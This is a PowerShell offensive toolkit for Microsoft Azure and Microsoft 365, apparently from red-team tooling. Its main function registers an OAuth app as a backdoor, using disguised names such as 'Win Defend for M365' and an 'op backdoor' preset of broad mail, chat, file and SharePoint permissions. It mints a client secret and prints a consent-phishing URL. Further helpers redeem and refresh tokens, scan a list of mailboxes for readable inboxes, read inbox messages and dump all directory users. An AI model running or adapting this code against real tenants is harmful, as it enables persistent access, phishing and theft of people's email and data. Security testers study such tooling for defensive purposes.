function Inject-OAuthApp{


<#
    .SYNOPSIS
        This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.        
    
    .PARAMETER AppName
        
        The display name of the App Registration. This is what will be displayed on the consent page.
    
    
    .PARAMETER ReplyUrl
        
        The reply URL to redirect a user to after app consent. This is where you will want to capture the OAuth code and complete the flow to obtain an access token and refresh token.
    
    .PARAMETER Scope
        
        Delegated Microsoft Graph permissions to scope to the app. Example: Mail.Read, User.ReadBasic.All, etc. Scope items need to be comma separated with each item in double quotes like this (-scope "Mail.Read","openid","email","profile","offline_access")
    
     .PARAMETER AccessToken
        
        Provide an already authenticated access token. 

    .EXAMPLE
        
        C:\PS> Inject-OAuthApp -AppName "Win Defend for M365" -Secret "HackThePlanet1337!" -ReplyUrl "https://windefend.azurewebsites.net" -scope "openid","Mail.Read","email","profile","offline_access"
        Description
        -----------
        This command will inject an app registration with the display name of "Win Defend for M365" with a scope of openid, Mail.Read, email, profile, and offline_access
    
    .EXAMPLE
        
        C:\PS> Inject-OAuthApp -AppName "Not a Backdoor" -ReplyUrl "https://windefend.azurewebsites.net" -scope "op backdoor" -AccessToken "eyJ0eXAiOiJKV..."
        Description
        -----------
        This command takes an already authenticated access token gathered from something like a device code login. It uses the hardcoded value of "op backdoor" as the scope to add a large number of permissions to the app registration. None of these permissions require admin consent. 
#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $AppName = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $ReplyUrl = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string[]]
    $Scope,
    
    [Parameter(Position = 3, Mandatory = $False)]
    [string[]]
    $AccessToken
  )
if($AccessToken){
    Write-Host -ForegroundColor yellow "[*] Using provided access token."
    $access_token = $AccessToken

}
else{
    # Login
    Write-Host -ForegroundColor yellow "[*] First you need to login as the user you want to deploy the app as."

    $body = @{
        "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
        "resource" =      "https://graph.microsoft.com"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
        }
        try{
        $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($tokens)
            {
                write-output $tokens
                $access_token = $tokens.access_token
                break
            }
        Start-Sleep -Seconds 3
    }    

}
$Headers = @{
    Authorization = "Bearer $access_token"
}

# Get Microsoft Graph Object ID
Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"


# Get full service principal list

$initialUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
$headers = @{"Authorization" = "Bearer $access_token"}

# Initialize an array to store all collected data
$allData = @()

# Loop until there's no more nextLink
do {
    # Invoke the web request
    $response = Invoke-WebRequest -Uri $initialUrl -Headers $headers

    # Convert the response content to JSON
    $jsonData = $response.Content | ConvertFrom-Json

    # Add the current page's data to the array
    $allData += $jsonData.value

    # Check if there's a nextLink
    if ($jsonData.'@odata.nextLink') {
        $initialUrl = $jsonData.'@odata.nextLink'
    } else {
       
        break
    }
} while ($true)

$appDisplayNameToSearch = "Microsoft Graph"
$graphId = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty appId
$graphIdInternal = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty Id
Write-Output "Graph ID: $graphId"
Write-Output "Internal Graph ID: $graphIdInternal"

# Get Object IDs of individual permissions
Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
$spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
$spnsjson = $spns.Content | ConvertFrom-Json

if ($Scope -like "op backdoor")
{
    $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All","Team.ReadBasic.All","Team.Create","Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All","Policy.Read.ConditionalAccess"
    Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
}
$scopeurl = ""
$accesslist = ""
$scopeIds = @{}
$joinedScope = $Scope -join " "
$joinedScope

# Loop through each item in $Scope
foreach ($item in $Scope){
    $variableName = $item -replace "[\W\d]", ""  # Remove non-alphanumeric characters and digits
    $variableName = $variableName + "Scope"
    

    $scopeItem = $spnsjson.oauth2PermissionScopes | Where-Object { $_.value -eq "$item" } |select-object id
    $scopeId = ('"' + $scopeItem.Id +'"')
    if (!$scopeId){Write-host -foregroundcolor red "[**] Couldn't find scope option $item"}
    else{
    Write-Host ($item + " : " + $scopeId)
    $scopeurl += "$item%20"
    $accesslist += '{"id": ' + $scopeId + ',"type": "Scope"},'
    
    # Store the scope ID in the hashtable
    $scopeIds[$variableName] = $scopeId
    }
}

Write-Host -ForegroundColor yellow "[*] Finished collecting object IDs of permissions."
# Create a resources variable
$permissions = $accesslist.Trim(",")

$resources = @"
{"resourceAppId": "$graphId", "resourceAccess": [$permissions]}
"@

# Create the app in the tenant
Write-host -ForegroundColor yellow "[*] Now deploying the app registration with display name $AppName to the tenant."

$resourceAccess = $resources | ConvertFrom-Json

# Construct the JSON body
$jsonBody = @{
    displayName         = $AppName
    signInAudience      = "AzureADMultipleOrgs"
    keyCredentials      = @()
    web                 = @{
        redirectUris = @($ReplyUrl)
    }
    requiredResourceAccess = @(
        @{
            resourceAppId   = $resourceAccess.resourceAppId
            resourceAccess = $resourceAccess.resourceAccess
        }
    )
}

# Convert the JSON body to a properly formatted JSON string
$finalJson = $jsonBody | ConvertTo-Json -Depth 10

$appcreationheaders = @{
    Authorization = "Bearer $access_token"
    "Content-Type" = "application/json"
    "Accept-Encoding" = "gzip, deflate"
}


$appresponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications" -Headers $appcreationheaders  -Method Post -Body $finaljson

if (!$appresponse){
    Write-host -ForegroundColor red "[*] An error occurred during deployment."
    break
}

$currentTime = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
$oneYearLater = (Get-Date).AddYears(1).ToString("yyyy-MM-ddTHH:mm:ssZ")
$secretCredential = @{
    passwordCredential = @{
        displayName = $null
        endDateTime = $oneYearLater
        startDateTime = $currentTime
    }
}
$SecretBody = $secretCredential | ConvertTo-Json
$applicationid = $appresponse.id
$secretrequest = Invoke-WebRequest -Headers $Headers -Method POST -ContentType "application/json" -Body $SecretBody -Uri "https://graph.microsoft.com/v1.0/applications/$applicationid/addPassword"

$secretdata = $secretrequest.Content |ConvertFrom-json

# Generate the Consent URL
Write-host -ForegroundColor yellow "[*] If everything worked successfully this is the consent URL you can use to grant consent to the app:"
$consentURL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=" + $appresponse.AppId + "&response_type=code&redirect_uri=
" + [System.Web.HttpUtility]::UrlEncode($ReplyUrl) + "&response_mode=query&scope=" + $scopeurl.Trim("%20") + "&state=1234"
Write-Host "--------------------------------------------------------"
Write-Host -ForegroundColor green $consentURL
Write-Host "--------------------------------------------------------"
Write-Host ("Application ID: " + $appresponse.AppId)

Write-Host ("Secret: " + $Secretdata.secretText)
Write-Host "--------------------------------------------------------"
Write-Host "After you obtain an OAuth Code from the redirect URI server you can use this command to complete the flow:"
Write-Host "--------------------------------------------------------"
$scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
Write-Host -ForegroundColor Cyan ('Get-AzureAccessToken -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean + " -AuthCode <insert your OAuth Code here>")
}


Function Invoke-GraphOpenInboxFinder{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $access_token = "",
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $userlist = ""
    )

    $Mailboxes = @(Get-Content -Path $userlist)
    $count = $Mailboxes.count
    $curr_mbx = 0

    Write-Output "`n`r"
    Write-Output "[*] Checking access to mailboxes for each email address..."
    Write-Output "`n`r"
    foreach($mbx in $Mailboxes)
    {
        $request = ""
        Write-Host -nonewline "$curr_mbx of $count mailboxes checked`r"
        $curr_mbx += 1
        try { $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$mbx/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"} 
        }catch{
            $err = $_.Exception.Response.StatusCode.Value__
        }
    
        If ($request.StatusCode -eq 200){
            Write-Host -ForegroundColor Green "[*] SUCCESS! Inbox of $mbx is readable."
            $out = $request.Content | ConvertFrom-Json
            Write-Host ("Latest Email Received " + $out.value.createdDateTime + " with subject: " + $out.value.subject)
        }
    }
}

## A few tools for working with Azure OAuth2 Authentication Codes and access_tokens
## By Beau Bullock @dafthack

Function Get-AzureAccessToken{

Param
(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Scope = "",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = "",

    [Parameter(Position = 4, Mandatory = $true)]
    [string]
    $AuthCode = ""
)

$body = @{client_id=$ClientID
scope=$Scope
code=$AuthCode
redirect_uri=$RedirectUri
grant_type="authorization_code"
client_secret=$ClientSecret
}

$request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
$parsed = $request.Content | ConvertFrom-Json
Write-Output "---Here is your access token---"
$parsed.access_token
Write-Output "---Here is your refresh token---"
$parsed.refresh_token
}

Function Check-MSGraphAccess{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $access_token = ""
    )

$request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{"Authorization" = "Bearer $access_token"}
$out = $request.Content | ConvertFrom-Json
$out
}

Function Get-NewAccessTokenWithRefreshToken{
Param
(
    [Parameter(Position = 0, Mandatory = $false)]
    [string]
    $Scope = "openid offline_access email user.read profile",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = "",

    [Parameter(Position = 4, Mandatory = $true)]
    [string]
    $RefreshToken = ""
)

$body = @{client_id=$ClientID
scope=$Scope
refresh_token=$RefreshToken
redirect_uri=$RedirectUri
grant_type="refresh_token"
client_secret=$ClientSecret
}

$request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
$parsed = $request.Content | ConvertFrom-Json
Write-Output "---Here is your access token---"
$parsed.access_token
Write-Output "---Here is your refresh token---"
$parsed.refresh_token


}

Function Get-Inbox{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $access_token = "",
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $userid = ""
    )

$request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"}
$out = $request.Content | ConvertFrom-Json

$out.value


}


Function Get-AzureADUsers{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $access_token = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $outfile = ""
    )

$request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users" -Headers @{"Authorization" = "Bearer $access_token"}
$out = $request.Content | ConvertFrom-Json

Write-Output "---All Azure AD User Principal Names---"
$out.value.userPrincipalName 
$out.value.userPrincipalName | Out-File -Encoding ASCII $outfile
}
